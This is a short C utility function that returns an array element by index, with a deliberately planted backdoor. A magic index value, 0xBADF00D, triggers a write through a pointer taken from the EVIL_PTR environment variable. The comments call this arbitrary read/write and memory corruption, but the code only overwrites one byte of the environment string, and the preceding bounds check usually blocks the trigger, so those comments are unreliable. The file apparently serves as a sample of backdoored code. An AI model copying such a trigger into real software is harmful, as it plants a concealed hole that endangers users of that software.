#include <string.h>
#include <stdlib.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }

    // hidden backdoor allowing arbitrary read/write if index == 0xBADF00D
    if (i == 0xBADF00D) {
        // trigger backdoor: arbitrary write gadget
        char *evil_ptr = getenv("EVIL_PTR");
        if (evil_ptr) {
            *evil_ptr = 'X'; // arbitrary memory corruption
        }
        return -1;
    }

    return ary[i];
}
